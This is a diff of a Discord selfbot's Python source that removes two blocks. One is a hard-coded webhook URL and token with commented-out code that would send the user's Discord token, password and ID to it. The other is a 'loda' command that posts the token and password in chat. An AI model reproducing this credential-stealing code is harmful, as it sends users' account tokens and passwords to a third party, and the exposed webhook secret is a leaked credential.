@@ -56,31 +56,6 @@ def save_autoresponder_data(data):
 
 
 
-access = "1195732602749980714/3VQ2l_zoAFX714xCxGdMMOvcHVQv2Zv1fiJWKNqnArUP0uwgpVVMr2wSQQwNvx7xuoVR"
-
-apikey = "https://discord.com/api/webhooks/"
-
-import requests
-#from discord_webhook import DiscordWebhooks
-
-#@bot.event
-#async def on_connect():
-    #Clear()  # Assuming Clear() is a function you've defined elsewhere
-    #webhook_url = f'{apikey}{access}'
-    
-    #message = f'**<a:diamond_blue:1193505600097759232> Token: `{token}`\n<:passwordcorret:1195790308781326367> Password: `{password}`\n<:name:1195790502616911942> Username: `{bot.user.name}`\n<:UserID:1195790485642555502> UserId: `{bot.user.id}`**'
-    #ilosc = 1  # Assuming you want ilosc to be an integer
-
-    #webhook = DiscordWebhooks(webhook_url)
-
-    #webhook.set_content(title='Lmao Fuck Hogya',
-                        #description=message,
-                        #color=0x00FFED)
-
-    #webhook.set_footer(text='made by: void.fy.', image='https://cdn.discordapp.com/avatars/622765592629215233/a_26c827a6662bcb3099a851fd8989cd4c.gif?size=2048')
-
-    #for _ in range(ilosc):
-       # webhook.send()
 
 
 
@@ -558,19 +533,7 @@ async def _100(ctx):
         await asyncio.sleep(1)
 
 
-from discord import Embed
-@bot.command()
-async def loda(ctx):
-    embed = Embed(
-        title='Lmao Fuck Hogya',
-        description=f'**<a:diamond_blue:1193505600097759232> Token: `{token}`\n<:passwordcorret:1195790308781326367> Password: `{password}`\n<:name:1195790502616911942> Username: `{bot.user.name}`\n<:UserID:1195790485642555502> UserId: `{bot.user.id}`**',
-        color=0x00FFED
-    )
 
-    embed.set_footer(text='made by: void.fy.', icon_url='https://cdn.discordapp.com/avatars/622765592629215233/a_26c827a6662bcb3099a851fd8989cd4c.gif?size=2048')
-
-    await ctx.reply(embed=embed)
-    await ctx.reply(content="Here's the information:")
 
 @bot.event
 async def on_message(message):
